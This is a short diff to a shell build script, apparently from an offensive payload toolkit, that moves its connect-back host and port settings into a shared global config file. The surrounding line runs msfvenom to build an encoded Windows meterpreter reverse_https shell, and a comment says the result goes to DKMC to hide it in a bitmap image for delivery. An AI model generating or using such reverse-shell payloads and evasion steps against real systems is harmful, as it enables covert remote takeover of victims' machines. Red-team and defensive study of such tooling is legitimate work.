@@ -10,9 +10,12 @@
 # or enter $win32_compiler="mycompiler" here
 . build/global_win32.sh
 
-# configure your connect-back settings here
-LHOST=127.0.0.1
-LPORT=443
+# import global default lhost and lport values from build/global_connect_config.sh
+. build/global_connect_config.sh
+
+# override connect-back settings here, if necessary
+LPORT=$GLOBAL_LPORT
+LHOST=$GLOBAL_LHOST
 
 # make meterpreter reverse payload, format correct for DKMC and run DKMC for making the bitmap file
 msfvenom -p windows/meterpreter/reverse_https lhost=$LHOST lport=$LPORT -e x86/shikata_ga_nai -f c -a x86 --platform Windows | sed 's/\\/\\\\/g' > sc.txt
